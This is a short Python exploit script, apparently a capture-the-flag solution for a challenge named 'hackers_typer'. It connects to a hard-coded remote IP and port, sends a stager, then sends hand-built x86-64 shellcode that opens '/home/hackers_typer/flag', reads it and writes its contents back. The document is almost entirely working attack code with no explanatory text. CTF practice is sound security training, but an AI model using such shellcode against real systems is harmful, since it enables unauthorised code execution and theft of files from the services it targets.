import pwnbox,struct
def help(x):
  ret = ""
  for i in x:
    ret += i.decode("Hex")[::-1]
  return ret

#p=pwnbox.pipe.ProcessPipe("./hackers_typer_26A0D44554F548F73033D2991DC0BDA1530274A1")
p=pwnbox.pipe.SocketPipe("45.32.38.83", 13579)
p.read_until("\n")
code = "\x50\x5e\x53\x5f\x41\x53\x5a\x53\x58\x0f\x05\xff"
p.write(code+"\n")
d = "/home/hackers_typer/flag\x00"
if len(d) %8 !=0: d ="/"*(8-len(d)%8)+ d
code = "\x90"*0x10
get_name = ""
for x in range(len(d)/8):
  tmp = d[8*x:8+8*x]
  get_name = "\x48\xb8"+tmp+"\x50"+get_name
code += get_name
code += "\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05"
code += "\x48\x89\xc7\x48\xc7\xc6\x00\x12\x60\x00\x48\xc7\xc2\x00\x02\x00\x00\x48\x31\xc0\x0f\x05\x48\x89\xc2\x48\x31\xff\x48\xff\xc7\x48\x31\xc0\x48\xff\xc0\x0f\x05"
p.write(code+"\n")
p.interact()

